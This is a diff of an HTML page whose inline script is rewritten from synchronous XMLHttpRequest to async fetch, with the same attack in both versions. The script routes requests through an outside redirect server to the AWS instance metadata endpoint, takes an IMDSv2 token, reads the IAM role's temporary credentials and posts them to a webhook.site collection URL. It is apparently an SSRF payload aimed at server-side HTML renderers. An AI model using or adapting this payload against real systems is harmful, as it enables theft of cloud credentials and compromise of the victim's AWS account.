@@ -1,36 +1,48 @@
 <html>
   <body>
     <script>
-      try {
-        // 1. Token
-        var xhr1 = new XMLHttpRequest();
-        xhr1.open("PUT", "http://13.221.230.104/redir.php?url=http://169.254.169.254/latest/api/token", false);
-        xhr1.setRequestHeader("X-aws-ec2-metadata-token-ttl-seconds", "21600");
-        xhr1.send();
-        var token = xhr1.responseText;
+      async function fetchIMDS() {
+        try {
+          // 1. Token
+          let res1 = await fetch("http://13.221.230.104/redir.php?url=" + encodeURIComponent("http://169.254.169.254/latest/api/token"), {
+            method: "PUT",
+            headers: {
+              "X-aws-ec2-metadata-token-ttl-seconds": "21600"
+            }
+          });
+          let token = await res1.text();
 
-        // 2. Get IAM role
-        var xhr2 = new XMLHttpRequest();
-        xhr2.open("GET", "http://13.221.230.104/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/", false);
-        xhr2.setRequestHeader("X-aws-ec2-metadata-token", token);
-        xhr2.send();
-        var role = xhr2.responseText.trim();
+          // 2. Get IAM role
+          let res2 = await fetch("http://13.221.230.104/redir.php?url=" + encodeURIComponent("http://169.254.169.254/latest/meta-data/iam/security-credentials/"), {
+            headers: {
+              "X-aws-ec2-metadata-token": token
+            }
+          });
+          let role = (await res2.text()).trim();
 
-        // 3. Get credentials
-        var xhr3 = new XMLHttpRequest();
-        xhr3.open("GET", "http://13.221.230.104/redir.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" + encodeURIComponent(role), false);
-        xhr3.setRequestHeader("X-aws-ec2-metadata-token", token);
-        xhr3.send();
-        var creds = xhr3.responseText;
+          // 3. Get credentials
+          let res3 = await fetch("http://13.221.230.104/redir.php?url=" + encodeURIComponent(`http://169.254.169.254/latest/meta-data/iam/security-credentials/${role}`), {
+            headers: {
+              "X-aws-ec2-metadata-token": token
+            }
+          });
+          let creds = await res3.text();
 
-        // 4. שליחה ל־Webhook
-        var xhr4 = new XMLHttpRequest();
-        xhr4.open("POST", "https://webhook.site/565628b3-9556-8e01-88059325cb8d", false);
-        xhr4.setRequestHeader("Content-Type", "application/json");
-        xhr4.send(JSON.stringify({creds: creds}));
-      } catch(e) {
-        console.error(e);
+          // 4. Send to webhook
+          await fetch("https://webhook.site/565628b3-9556-8e01-88059325cb8d", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify({creds: creds})
+          });
+
+          console.log("Credentials sent successfully");
+        } catch(e) {
+          console.error("Error:", e);
+        }
       }
+      fetchIMDS();
     </script>
   </body>
 </html>
